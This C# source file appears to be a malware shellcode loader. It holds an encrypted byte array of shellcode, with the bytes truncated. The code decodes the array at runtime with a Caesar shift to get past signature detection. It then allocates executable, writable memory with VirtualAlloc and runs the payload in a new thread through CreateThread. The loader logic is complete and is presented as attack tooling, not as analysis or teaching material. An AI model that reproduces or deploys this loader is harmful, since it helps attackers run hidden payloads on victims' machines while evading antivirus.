using System;
using System.Runtime.InteropServices;

namespace Loader
{
    class Program
    {
        // Win32 API imports
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Encrypted shellcode (from Encrypter app)
            byte[] buf = new byte[] {
                0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02,..... 
              };

            //  Decrypt shellcode at runtime (Caesar Cipher, key=2)
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }

            //  Allocate memory for shellcode
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length,
                0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

            //  Copy decrypted shellcode into memory
            Marshal.Copy(buf, 0, addr, buf.Length);

            //  Create thread to run shellcode
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            //  Wait indefinitely for shellcode execution
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
